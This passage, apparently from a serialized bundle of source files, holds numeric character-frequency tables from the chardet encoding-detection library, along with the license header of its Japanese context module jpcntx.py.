731,2468,1116,2014,2051,6139,1261, # 2368\n1593, 803,2859,2736,3443, 556, 682, 823,1541,6140,1369,2289,1706,2794, 845, 462, # 2384\n2603,2665,1361, 387, 162,2358,1740, 739,1770,1720,1304,1401,3241,1049, 627,1571, # 2400\n2427,3526,1877,3942,1852,1500, 431,1910,1503, 677, 297,2795, 286,1433,1038,1198, # 2416\n2290,1133,1596,4113,4639,2469,1510,1484,3943,6141,2442, 108, 712,4640,2372, 866, # 2432\n3701,2755,3242,1348, 834,1945,1408,3527,2395,3243,1811, 824, 994,1179,2110,1548, # 2448\n1453, 790,3003, 690,4324,4325,2832,2909,3820,1860,3821, 225,1748, 310, 346,1780, # 2464\n2470, 821,1993,2717,2796, 828, 877,3528,2860,2471,1702,2165,2910,2486,1789, 453, # 2480\n 359,2291,1676,  73,1164,1461,1127,3311, 421, 604, 314,1037, 589, 116,2487, 737, # 2496\n 837,1180, 111, 244, 735,6142,2261,1861,1362, 986, 523, 418, 581,2666,3822, 103, # 2512\n 855, 503,1414,1867,2488,1091, 657,1597, 979, 605,1316,4641,1021,2443,2078,2001, # 2528\n1209,  96, 587,2166,1032, 260,1072,2153, 173,  94, 226,3244, 819,2006,4642,4114, # 2544\n2203, 231,1744, 782,  97,2667, 786,3387, 887, 391, 442,2219,4326,1425,6143,2694, # 2560\n 633,1544,1202, 483,2015, 592,2052,1958,2472,1655, 419, 129,4327,3444,3312,1714, # 2576\n1257,3078,4328,1518,1098, 865,1310,1019,1885,1512,1734, 469,2444, 148, 773, 436, # 2592\n1815,1868,1128,1055,4329,1245,2756,3445,2154,1934,1039,4643, 579,1238, 932,2320, # 2608\n 353, 205, 801, 115,2428, 944,2321,1881, 399,2565,1211, 678, 766,3944, 335,2101, # 2624\n1459,1781,1402,3945,2737,2131,1010, 844, 981,1326,1013, 550,1816,1545,2620,1335, # 2640\n1008, 371,2881, 936,1419,1613,3529,1456,1395,2273,1834,2604,1317,2738,2503, 416, # 2656\n1643,4330, 806,1126, 229, 591,3946,1314,1981,1576,1837,1666, 347,1790, 977,3313, # 2672\n 764,2861,1853, 688,2429,1920,1462,  77, 595, 415,2002,3034, 798,1192,4115,6144, # 2688\n2978,4331,3035,2695,2582,2072,2566, 430,2430,1727, 842,1396,3947,3702, 613, 377, # 2704\n 278, 236,1417,3388,3314,3174, 757,1869, 107,3530,6145,1194, 623,2262, 207,1253, # 2720\n2167,3446,3948, 492,1117,1935, 536,1838,2757,1246,4332, 696,2095,2406,1393,1572, # 2736\n3175,1782, 583, 190, 253,1390,2230, 830,3126,3389, 934,3245,1703,1749,2979,1870, # 2752\n2545,1656,2204, 869,2346,4116,3176,1817, 496,1764,4644, 942,1504, 404,1903,1122, # 2768\n1580,3606,2945,1022, 515, 372,1735, 955,2431,3036,6146,2797,1110,2302,2798, 617, # 2784\n6147, 441, 762,1771,3447,3607,3608,1904, 840,3037,  86, 939,1385, 572,1370,2445, # 2800\n1336, 114,3703, 898, 294, 203,3315, 703,1583,2274, 429, 961,4333,1854,1951,3390, # 2816\n2373,3704,4334,1318,1381, 966,1911,2322,1006,1155, 309, 989, 458,2718,1795,1372, # 2832\n1203, 252,1689,1363,3177, 517,1936, 168,1490, 562, 193,3823,1042,4117,1835, 551, # 2848\n 470,4645, 395, 489,3448,1871,1465,2583,2641, 417,1493, 279,1295, 511,1236,1119, # 2864\n  72,1231,1982,1812,3004, 871,1564, 984,3449,1667,2696,2096,4646,2347,2833,1673, # 2880\n3609, 695,3246,2668, 807,1183,4647, 890, 388,2333,1801,1457,2911,1765,1477,1031, # 2896\n3316,3317,1278,3391,2799,2292,2526, 163,3450,4335,2669,1404,1802,6148,2323,2407, # 2912\n1584,1728,1494,1824,1269, 298, 909,3318,1034,1632, 375, 776,1683,2061, 291, 210, # 2928\n1123, 809,1249,1002,2642,3038, 206,1011,2132, 144, 975, 882,1565, 342, 667, 754, # 2944\n1442,2143,1299,2303,2062, 447, 626,2205,1221,2739,2912,1144,1214,2206,2584, 760, # 2960\n1715, 614, 950,1281,2670,2621, 810, 577,1287,2546,4648, 242,2168, 250,2643, 691, # 2976\n 123,2644, 647, 313,1029, 689,1357,2946,1650, 216, 771,1339,1306, 808,2063, 549, # 2992\n 913,1371,2913,2914,6149,1466,1092,1174,1196,1311,2605,2396,1783,1796,3079, 406, # 3008\n2671,2117,3949,4649, 487,1825,2220,6150,2915, 448,2348,1073,6151,2397,1707, 130, # 3024\n 900,1598, 329, 176,1959,2527,1620,6152,2275,4336,3319,1983,2191,3705,3610,2155, # 3040\n3706,1912,1513,1614,6153,1988, 646, 392,2304,1589,3320,3039,1826,1239,1352,1340, # 3056\n2916, 505,2567,1709,1437,2408,2547, 906,6154,2672, 384,1458,1594,1100,1329, 710, # 3072\n 423,3531,2064,2231,2622,1989,2673,1087,1882, 333, 841,3005,1296,2882,2379, 580, # 3088\n1937,1827,1293,2585, 601, 574, 249,1772,4118,2079,1120, 645, 901,1176,1690, 795, # 3104\n2207, 478,1434, 516,1190,1530, 761,2080, 930,1264, 355, 435,1552, 644,1791, 987, # 3120\n 220,1364,1163,1121,1538, 306,2169,1327,1222, 546,2645, 218, 241, 610,1704,3321, # 3136\n1984,1839,1966,2528, 451,6155,2586,3707,2568, 907,3178, 254,2947, 186,1845,4650, # 3152\n 745, 432,1757, 428,1633, 888,2246,2221,2489,3611,2118,1258,1265, 956,3127,1784, # 3168\n4337,2490, 319, 510, 119, 457,3612, 274,2035,2007,4651,1409,3128, 970,2758, 590, # 3184\n2800, 661,2247,4652,2008,3950,1420,1549,3080,3322,3951,1651,1375,2111, 485,2491, # 3200\n1429,1156,6156,2548,2183,1495, 831,1840,2529,2446, 501,1657, 307,1894,3247,1341, # 3216\n 666, 899,2156,1539,2549,1559, 886, 349,2208,3081,2305,1736,3824,2170,2759,1014, # 3232\n1913,1386, 542,1397,2948, 490, 368, 716, 362, 159, 282,2569,1129,1658,1288,1750, # 3248\n2674, 276, 649,2016, 751,1496, 658,1818,1284,1862,2209,2087,2512,3451, 622,2834, # 3264\n 376, 117,1060,2053,1208,1721,1101,1443, 247,1250,3179,1792,3952,2760,2398,3953, # 3280\n6157,2144,3708, 446,2432,1151,2570,3452,2447,2761,2835,1210,2448,3082, 424,2222, # 3296\n1251,2449,2119,2836, 504,1581,4338, 602, 817, 857,3825,2349,2306, 357,3826,1470, # 3312\n1883,2883, 255, 958, 929,2917,3248, 302,4653,1050,1271,1751,2307,1952,1430,2697, # 3328\n2719,2359, 354,3180, 777, 158,2036,4339,1659,4340,4654,2308,2949,2248,1146,2232, # 3344\n3532,2720,1696,2623,3827,6158,3129,1550,2698,1485,1297,1428, 637, 931,2721,2145, # 3360\n 914,2550,2587,  81,2450, 612, 827,2646,1242,4655,1118,2884, 472,1855,3181,3533, # 3376\n3534, 569,1353,2699,1244,1758,2588,4119,2009,2762,2171,3709,1312,1531,6159,1152, # 3392\n1938, 134,1830, 471,3710,2276,1112,1535,3323,3453,3535, 982,1337,2950, 488, 826, # 3408\n 674,1058,1628,4120,2017, 522,2399, 211, 568,1367,3454, 350, 293,1872,1139,3249, # 3424\n1399,1946,3006,1300,2360,3324, 588, 736,6160,2606, 744, 669,3536,3828,6161,1358, # 3440\n 199, 723, 848, 933, 851,1939,1505,1514,1338,1618,1831,4656,1634,3613, 443,2740, # 3456\n3829, 717,1947, 491,1914,6162,2551,1542,4121,1025,6163,1099,1223, 198,3040,2722, # 3472\n 370, 410,1905,2589, 998,1248,3182,2380, 519,1449,4122,1710, 947, 928,1153,4341, # 3488\n2277, 344,2624,1511, 615, 105, 161,1212,1076,1960,3130,2054,1926,1175,1906,2473, # 3504\n 414,1873,2801,6164,2309, 315,1319,3325, 318,2018,2146,2157, 963, 631, 223,4342, # 3520\n4343,2675, 479,3711,1197,2625,3712,2676,2361,6165,4344,4123,6166,2451,3183,1886, # 3536\n2184,1674,1330,1711,1635,1506, 799, 219,3250,3083,3954,1677,3713,3326,2081,3614, # 3552\n1652,2073,4657,1147,3041,1752, 643,1961, 147,1974,3955,6167,1716,2037, 918,3007, # 3568\n1994, 120,1537, 118, 609,3184,4345, 740,3455,1219, 332,1615,3830,6168,1621,2980, # 3584\n1582, 783, 212, 553,2350,3714,1349,2433,2082,4124, 889,6169,2310,1275,1410, 973, # 3600\n 166,1320,3456,1797,1215,3185,2885,1846,2590,2763,4658, 629, 822,3008, 763, 940, # 3616\n1990,2862, 439,2409,1566,1240,1622, 926,1282,1907,2764, 654,2210,1607, 327,1130, # 3632\n3956,1678,1623,6170,2434,2192, 686, 608,3831,3715, 903,3957,3042,6171,2741,1522, # 3648\n1915,1105,1555,2552,1359, 323,3251,4346,3457, 738,1354,2553,2311,2334,1828,2003, # 3664\n3832,1753,2351,1227,6172,1887,4125,1478,6173,2410,1874,1712,1847, 520,1204,2607, # 3680\n 264,4659, 836,2677,2102, 600,4660,3833,2278,3084,6174,4347,3615,1342, 640, 532, # 3696\n 543,2608,1888,2400,2591,1009,4348,1497, 341,1737,3616,2723,1394, 529,3252,1321, # 3712\n 983,4661,1515,2120, 971,2592, 924, 287,1662,3186,4349,2700,4350,1519, 908,1948, # 3728\n2452, 156, 796,1629,1486,2223,2055, 694,4126,1259,1036,3392,1213,2249,2742,1889, # 3744\n1230,3958,1015, 910, 408, 559,3617,4662, 746, 725, 935,4663,3959,3009,1289, 563, # 3760\n 867,4664,3960,1567,2981,2038,2626, 988,2263,2381,4351, 143,2374, 704,1895,6175, # 3776\n1188,3716,2088, 673,3085,2362,4352, 484,1608,1921,2765,2918, 215, 904,3618,3537, # 3792\n 894, 509, 976,3043,2701,3961,4353,2837,2982, 498,6176,6177,1102,3538,1332,3393, # 3808\n1487,1636,1637, 233, 245,3962, 383, 650, 995,3044, 460,1520,1206,2352, 749,3327, # 3824\n 530, 700, 389,1438,1560,1773,3963,2264, 719,2951,2724,3834, 870,1832,1644,1000, # 3840\n 839,2474,3717, 197,1630,3394, 365,2886,3964,1285,2133, 734, 922, 818,1106, 732, # 3856\n 480,2083,1774,3458, 923,2279,1350, 221,3086,  85,2233,2234,3835,1585,3010,2147, # 3872\n1387,1705,2382,1619,2475, 133, 239,2802,1991,1016,2084,2383, 411,2838,1113, 651, # 3888\n1985,1160,3328, 990,1863,3087,1048,1276,2647, 265,2627,1599,3253,2056, 150, 638, # 3904\n2019, 656, 853, 326,1479, 680,1439,4354,1001,1759, 413,3459,3395,2492,1431, 459, # 3920\n4355,1125,3329,2265,1953,1450,2065,2863, 849, 351,2678,3131,3254,3255,1104,1577, # 3936\n 227,1351,1645,2453,2193,1421,2887, 812,2121, 634,  95,2435, 201,2312,4665,1646, # 3952\n1671,2743,1601,2554,2702,2648,2280,1315,1366,2089,3132,1573,3718,3965,1729,1189, # 3968\n 328,2679,1077,1940,1136, 558,1283, 964,1195, 621,2074,1199,1743,3460,3619,1896, # 3984\n1916,1890,3836,2952,1154,2112,1064, 862, 378,3011,2066,2113,2803,1568,2839,6178, # 4000\n3088,2919,1941,1660,2004,1992,2194, 142, 707,1590,1708,1624,1922,1023,1836,1233, # 4016\n1004,2313, 789, 741,3620,6179,1609,2411,1200,4127,3719,3720,4666,2057,3721, 593, # 4032\n2840, 367,2920,1878,6180,3461,1521, 628,1168, 692,2211,2649, 300, 720,2067,2571, # 4048\n2953,3396, 959,2504,3966,3539,3462,1977, 701,6181, 954,1043, 800, 681, 183,3722, # 4064\n1803,1730,3540,4128,2103, 815,2314, 174, 467, 230,2454,1093,2134, 755,3541,3397, # 4080\n1141,1162,6182,1738,2039, 270,3256,2513,1005,1647,2185,3837, 858,1679,1897,1719, # 4096\n2954,2324,1806, 402, 670, 167,4129,1498,2158,2104, 750,6183, 915, 189,1680,1551, # 4112\n 455,4356,1501,2455, 405,1095,2955, 338,1586,1266,1819, 570, 641,1324, 237,1556, # 4128\n2650,1388,3723,6184,1368,2384,1343,1978,3089,2436, 879,3724, 792,1191, 758,3012, # 4144\n1411,2135,1322,4357, 240,4667,1848,3725,1574,6185, 420,3045,1546,1391, 714,4358, # 4160\n1967, 941,1864, 863, 664, 426, 560,1731,2680,1785,2864,1949,2363, 403,3330,1415, # 4176\n1279,2136,1697,2335, 204, 721,2097,3838,  90,6186,2085,2505, 191,3967, 124,2148, # 4192\n1376,1798,1178,1107,1898,1405, 860,4359,1243,1272,2375,2983,1558,2456,1638, 113, # 4208\n3621, 578,1923,2609, 880, 386,4130, 784,2186,2266,1422,2956,2172,1722, 497, 263, # 4224\n2514,1267,2412,2610, 177,2703,3542, 774,1927,1344, 616,1432,1595,1018, 172,4360, # 4240\n2325, 911,4361, 438,1468,3622, 794,3968,2024,2173,1681,1829,2957, 945, 895,3090, # 4256\n 575,2212,2476, 475,2401,2681, 785,2744,1745,2293,2555,1975,3133,2865, 394,4668, # 4272\n3839, 635,4131, 639, 202,1507,2195,2766,1345,1435,2572,3726,1908,1184,1181,2457, # 4288\n3727,3134,4362, 843,2611, 437, 916,4669, 234, 769,1884,3046,3047,3623, 833,6187, # 4304\n1639,2250,2402,1355,1185,2010,2047, 999, 525,1732,1290,1488,2612, 948,1578,3728, # 4320\n2413,2477,1216,2725,2159, 334,3840,1328,3624,2921,1525,4132, 564,1056, 891,4363, # 4336\n1444,1698,2385,2251,3729,1365,2281,2235,1717,6188, 864,3841,2515, 444, 527,2767, # 4352\n2922,3625, 544, 461,6189, 566, 209,2437,3398,2098,1065,2068,3331,3626,3257,2137, # 4368  #last 512\n)\n\n\n", "thirdparty/chardet/jpcntx.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n\n# This is hiragana 2-char sequence table, the number in each cell represents its frequency category\njp2CharContext = (\n(0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1),\n(2,4,0,4,0,3,0,4,0,3,4,4,4,2,4,3,3,4,3,2,3,3,4,2,3,3,3,2,4,1,4,3,3,1,5,4,3,4,3,4,3,5,3,0,3,5,4,2,0,3,1,0,3,3,0,3,3,0,1,1,0,4,3,0,3,3,0,4,0,2,0,3,5,5,5,5,4,0,4,1,0,3,4),\n(0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2),\n(0,4,0,5,0,5,0,4,0,4,5,4,4,3,5,3,5,1,5,3,4,3,4,4,3,4,3,3,4,3,5,4,4,3,5,5,3,5,5,5,3,5,5,3,4,5,5,3,1,3,2,0,3,4,0,4,2,0,4,2,1,5,3,2,3,5,0,4,0,2,0,5,4,4,5,4,5,0,4,0,0,4,4),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),\n(0,3,0,4,0,3,0,3,0,4,5,4,3,3,3,3,4,3,5,4,4,3,5,4,4,3,4,3,4,4,4,4,5,3,4,4,3,4,5,5,4,5,5,1,4,5,4,3,0,3,3,1,3,3,0,4,4,0,3,3,1,5,3,3,3,5,0,4,0,3,0,4,4,3,4,3,3,0,4,1,1,3,4),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),\n(0,4,0,3,0,3,0,4,0,3,4,4,3,2,2,1,2,1,3,1,3,3,3,3,3,4,3,1,3,3,5,3,3,0,4,3,0,5,4,3,3,5,4,4,3,4,4,5,0,1,2,0,1,2,0,2,2,0,1,0,0,5,2,2,1,4,0,3,0,1,0,4,4,3,5,4,3,0,2,1,0,4,3),\n(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),\n(0,3,0,5,0,4,0,2,1,4,4,2,4,1,4,2,4,2,4,3,3,3,4,3,3,3,3,1,4,2,3,3,3,1,4,4,1,1,1,4,3,3,2,0,2,4,3,2,0,3,3,0,3,1,1,0,0,0,3,3,0,4,2,2,3,4,0,4,0,3,0,4,4,5,3,4,4,0,3,0,0,1,4),\n(1,4,0,4,0,4,0,4,0,3,5,4,4,3,4,3,5,4,3,3,4,3,5,4,4,4,4,3,4,2,4,3,3,1,5,4,3,2,4,5,4,5,5,4,4,5,4,4,0,3,2,2,3,3,0,4,3,1,3,2,1,4,3,3,4,5,0,3,0,2,0,4,5,5,4,5,4,0,4,0,0,5,4),\n(0,5,0,5,0,4,0,3,0,4,4,3,4,3,3,3,4,0,4,4,4,3,4,3,4,3,3,1,4,2,4,3,4,0,5,4,1,4,5,4,4,5,3,2,4,3,4,3,2,4,1,3,3,3,2,3,2,0,4,3,3,4,3,3,3,4,0,4,0,3,0,4,5,4,4,4,3,0,4,1,0,1,3),\n(0,3,1,4,0,3,0,2,0,3,4,4,3,1,4,2,3,3,4,3,4,3,4,3,4,4,3,2,3,1,5,4,4,1,4,4,3,5,4,4,3,5,5,4,3,4,4,3,1,2,3,1,2,2,0,3,2,0,3,1,0,5,3,3,3,4,3,3,3,3,4,4,4,4,5,4,2,0,3,3,2,4,3),\n(0,2,0,3,0,1,0,1,0,0,3,2,0,0,2,0,1,0,2,1,3,3,3,1,2,3,1,0,1,0,4,2,1,1,3,3,0,4,3,3,1,4,3,3,0,3,3,2,0,0,0,0,1,0,0,2,0,0,0,0,0,4,1,0,2,3,2,2,2,1,3,3,3,4,4,3,2,0,3,1,0,3,3),\n(0,4,0,4,0,3,0,3,0,4,4,4,3,3,3,3,3,3,4,3,4,2,4,3,4,3,3,2,4,3,4,5,4,1,4,5,3,5,4,5,3,5,4,0,3,5,5,3,1,3,3,2,2,3,0,3,4,1,3,3,2,4,3,3,3,4,0,4,0,3,0,4,5,4,4,5,3,0,4,1,0,3,4),\n(0,2,0,3,0,3,0,0,0,2,2,2,1,0,1,0,0,0,3,0,3,0,3,0,1,3,1,0,3,1,3,3,3,1,3,3,3,0,1,3,1,3,4,0,0,3,1,1,0,3,2,0,0,0,0,1,3,0,1,0,0,3,3,2,0,3,0,0,0,0,0,3,4,3,4,3,3,0,3,0,0,2,3),\n(2,3,0,3,0,2,0,1,0,3,3,4,3,1,3,1,1,1,3,1,4,3,4,3,3,3,0,0,3,1,5,4,3,1,4,3,2,5,5,4,4,4,4,3,3,4,4,4,0,2,1,1,3,2,0,1,2,0,0,1,0,4,1,3,3,3,0,3,0,1,0,4,4,4,5,5,3,0,2,0,0,4,4),\n(0,2,0,1,0,3,1,3,0,2,3,3,3,0,3,1,0,0,3,0,3,2,3,1,3,2,1,1,0,0,4,2,1,0,2,3,1,4,3,2,0,4,4,3,1,3,1,3,0,1,0,0,1,0,0,0,1,0,0,0,0,4,1,1,1,2,0,3,0,0,0,3,4,2,4,3,2,0,1,0,0,3,3),\n(0,1,0,4,0,5,0,4,0,2,4,4,2,3,3,2,3,3,5,3,3,3,4,3,4,2,3,0,4,3,3,3,4,1,4,3,2,1,5,5,3,4,5,1,3,5,4,2,0,3,3,0,1,3,0,4,2,0,1,3,1,4,3,3,3,3,0,3,0,1,0,3,4,4,4,5,5,0,3,0,1,4,5),\n(0,2,0,3,0,3,0,0,0,2,3,1,3,0,4,0,1,1,3,0,3,4,3,2,3,1,0,3,3,2,3,1,3,0,2,3,0,2,1,4,1,2,2,0,0,3,3,0,0,2,0,0,0,1,0,0,0,0,2,2,0,3,2,1,3,3,0,2,0,2,0,0,3,3,1,2,4,0,3,0,2,2,3),\n(2,4,0,5,0,4,0,4,0,2,4,4,4,3,4,3,3,3,1,2,4,3,4,3,4,4,5,0,3,3,3,3,2,0,4,3,1,4,3,4,1,4,4,3,3,4,4,3,1,2,3,0,4,2,0,4,1,0,3,3,0,4,3,3,3,4,0,4,0,2,0,3,5,3,4,5,2,0,3,0,0,4,5),\n(0,3,0,4,0,1,0,1,0,1,3,2,2,1,3,0,3,0,2,0,2,0,3,0,2,0,0,0,1,0,1,1,0,0,3,1,0,0,0,4,0,3,1,0,2,1,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,4,2,2,3,1,0,3,0,0,0,1,4,4,4,3,0,0,4,0,0,1,4),\n(1,4,1,5,0,3,0,3,0,4,5,4,4,3,5,3,3,4,4,3,4,1,3,3,3,3,2,1,4,1,5,4,3,1,4,4,3,5,4,4,3,5,4,3,3,4,4,4,0,3,3,1,2,3,0,3,1,0,3,3,0,5,4,4,4,4,4,4,3,3,5,4,4,3,3,5,4,0,3,2,0,4,4),\n(0,2,0,3,0,1,0,0,0,1,3,3,3,2,4,1,3,0,3,1,3,0,2,2,1,1,0,0,2,0,4,3,1,0,4,3,0,4,4,4,1,4,3,1,1,3,3,1,0,2,0,0,1,3,0,0,0,0,2,0,0,4,3,2,4,3,5,4,3,3,3,4,3,3,4,3,3,0,2,1,0,3,3),\n(0,2,0,4,0,3,0,2,0,2,5,5,3,4,4,4,4,1,4,3,3,0,4,3,4,3,1,3,3,2,4,3,0,3,4,3,0,3,4,4,2,4,4,0,4,5,3,3,2,2,1,1,1,2,0,1,5,0,3,3,2,4,3,3,3,4,0,3,0,2,0,4,4,3,5,5,0,0,3,0,2,3,3),\n(0,3,0,4,0,3,0,1,0,3,4,3,3,1,3,3,3,0,3,1,3,0,4,3,3,1,1,0,3,0,3,3,0,0,4,4,0,1,5,4,3,3,5,0,3,3,4,3,0,2,0,1,1,1,0,1,3,0,1,2,1,3,3,2,3,3,0,3,0,1,0,1,3,3,4,4,1,0,1,2,2,1,3),\n(0,1,0,4,0,4,0,3,0,1,3,3,3,2,3,1,1,0,3,0,3,3,4,3,2,4,2,0,1,0,4,3,2,0,4,3,0,5,3,3,2,4,4,4,3,3,3,4,0,1,3,0,0,1,0,0,1,0,0,0,0,4,2,3,3,3,0,3,0,0,0,4,4,4,5,3,2,0,3,3,0,3,5),\n(0,2,0,3,0,0,0,3,0,1,3,0,2,0,0,0,1,0,3,1,1,3,3,0,0,3,0,0,3,0,2,3,1,0,3,1,0,3,3,2,0,4,2,2,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,2,1,2,0,1,0,1,0,0,0,1,3,1,2,0,0,0,1,0,0,1,4),\n(0,3,0,3,0,5,0,1,0,2,4,3,1,3,3,2,1,1,5,2,1,0,5,1,2,0,0,0,3,3,2,2,3,2,4,3,0,0,3,3,1,3,3,0,2,5,3,4,0,3,3,0,1,2,0,2,2,0,3,2,0,2,2,3,3,3,0,2,0,1,0,3,4,4,2,5,4,0,3,0,0,3,5),\n(0,3,0,3,0,3,0,1,0,3,3,3,3,0,3,0,2,0,2,1,1,0,2,0,1,0,0,0,2,1,0,0,1,0,3,2,0,0,3,3,1,2,3,1,0,3,3,0,0,1,0,0,0,0,0,2,0,0,0,0,0,2,3,1,2,3,0,3,0,1,0,3,2,1,0,4,3,0,1,1,0,3,3),\n(0,4,0,5,0,3,0,3,0,4,5,5,4,3,5,3,4,3,5,3,3,2,5,3,4,4,4,3,4,3,4,5,5,3,4,4,3,4,4,5,4,4,4,3,4,5,5,4,2,3,4,2,3,4,0,3,3,1,4,3,2,4,3,3,5,5,0,3,0,3,0,5,5,5,5,4,4,0,4,0,1,4,4),\n(0,4,0,4,0,3,0,3,0,3,5,4,4,2,3,2,5,1,3,2,5,1,4,2,3,2,3,3,4,3,3,3,3,2,5,4,1,3,3,5,3,4,4,0,4,4,3,1,1,3,1,0,2,3,0,2,3,0,3,0,0,4,3,1,3,4,0,3,0,2,0,4,4,4,3,4,5,0,4,0,0,3,4),\n(0,3,0,3,0,3,1,2,0,3,4,4,3,3,3,0,2,2,4,3,3,1,3,3,3,1,1,0,3,1,4,3,2,3,4,4,2,4,4,4,3,4,4,3,2,4,4,3,1,3,3,1,3,3,0,4,1,0,2,2,1,4,3,2,3,3,5,4,3,3,5,4,4,3,3,0,4,0,3,2,2,4,4),\n(0,2,0,1,0,0,0,0,0,1,2,1,3,0,0,0,0,0,2,0,1,2,1,0,0,1,0,0,0,0,3,0,0,1,0,1,1,3,1,0,0,0,1,1,0,1,1,0,0,0,0,0,2,0,0,0,0,0,0,0,0,1,1,2,2,0,3,4,0,0,0,1,1,0,0,1,0,0,0,0,0,1,1),\n(0,1,0,0,0,1,0,0,0,0,4,0,4,1,4,0,3,0,4,0,3,0,4,0,3,0,3,0,4,1,5,1,4,0,0,3,0,5,0,5,2,0,1,0,0,0,2,1,4,0,1,3,0,0,3,0,0,3,1,1,4,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0),\n(1,4,0,5,0,3,0,2,0,3,5,4,4,3,4,3,5,3,4,3,3,0,4,3,3,3,3,3,3,2,4,4,3,1,3,4,4,5,4,4,3,4,4,1,3,5,4,3,3,3,1,2,2,3,3,1,3,1,3,3,3,5,3,3,4,5,0,3,0,3,0,3,4,3,4,4,3,0,3,0,2,4,3),\n(0,1,0,4,0,0,0,0,0,1,4,0,4,1,4,2,4,0,3,0,1,0,1,0,0,0,0,0,2,0,3,1,1,1,0,3,0,0,0,1,2,1,0,0,1,1,1,1,0,1,0,0,0,1,0,0,3,0,0,0,0,3,2,0,2,2,0,1,0,0,0,2,3,2,3,3,0,0,0,0,2,1,0),\n(0,5,1,5,0,3,0,3,0,5,4,4,5,1,5,3,3,0,4,3,4,3,5,3,4,3,3,2,4,3,4,3,3,0,3,3,1,4,4,3,4,4,4,3,4,5,5,3,2,3,1,1,3,3,1,3,1,1,3,3,2,4,5,3,3,5,0,4,0,3,0,4,4,3,5,3,3,0,3,4,0,4,3),\n(0,5,0,5,0,3,0,2,0,4,4,3,5,2,4,3,3,3,4,4,4,3,5,3,5,3,3,1,4,0,4,3,3,0,3,3,0,4,4,4,4,5,4,3,3,5,5,3,2,3,1,2,3,2,0,1,0,0,3,2,2,4,4,3,1,5,0,4,0,3,0,4,3,1,3,2,1,0,3,3,0,3,3),\n(0,4,0,5,0,5,0,4,0,4,5,5,5,3,4,3,3,2,5,4,4,3,5,3,5,3,4,0,4,3,4,4,3,2,4,4,3,4,5,4,4,5,5,0,3,5,5,4,1,3,3,2,3,3,1,3,1,0,4,3,1,4,4,3,4,5,0,4,0,2,0,4,3,4,4,3,3,0,4,0,0,5,5),\n(0,4,0,4,0,5,0,1,1,3,3,4,4,3,4,1,3,0,5,1,3,0,3,1,3,1,1,0,3,0,3,3,4,0,4,3,0,4,4,4,3,4,4,0,3,5,4,1,0,3,0,0,2,3,0,3,1,0,3,1,0,3,2,1,3,5,0,3,0,1,0,3,2,3,3,4,4,0,2,2,0,4,4),\n(2,4,0,5,0,4,0,3,0,4,5,5,4,3,5,3,5,3,5,3,5,2,5,3,4,3,3,4,3,4,5,3,2,1,5,4,3,2,3,4,5,3,4,1,2,5,4,3,0,3,3,0,3,2,0,2,3,0,4,1,0,3,4,3,3,5,0,3,0,1,0,4,5,5,5,4,3,0,4,2,0,3,5),\n(0,5,0,4,0,4,0,2,0,5,4,3,4,3,4,3,3,3,4,3,4,2,5,3,5,3,4,1,4,3,4,4,4,0,3,5,0,4,4,4,4,5,3,1,3,4,5,3,3,3,3,3,3,3,0,2,2,0,3,3,2,4,3,3,3,5,3,4,1,3,3,5,3,2,0,0,0,0,4,3,1,3,3),\n(0,1,0,3,0,3,0,1,0,1,3,3,3,2,3,3,3,0,3,0,0,0,3,1,3,0,0,0,2,2,2,3,0,0,3,2,0,1,2,4,1,3,3,0,0,3,3,3,0,1,0,0,2,1,0,0,3,0,3,1,0,3,0,0,1,3,0,2,0,1,0,3,3,1,3,3,0,0,1,1,0,3,3),\n(0,2,0,3,0,2,1,4,0,2,2,3,1,1,3,1,1,0,2,0,3,1,2,3,1,3,0,0,1,0,4,3,2,3,3,3,1,4,2,3,3,3,3,1,0,3,1,4,0,1,1,0,1,2,0,1,1,0,1,1,0,3,1,3,2,2,0,1,0,0,0,2,3,3,3,1,0,0,0,0,0,2,3),\n(0,5,0,4,0,5,0,2,0,4,5,5,3,3,4,3,3,1,5,4,4,2,4,4,4,3,4,2,4,3,5,5,4,3,3,4,3,3,5,5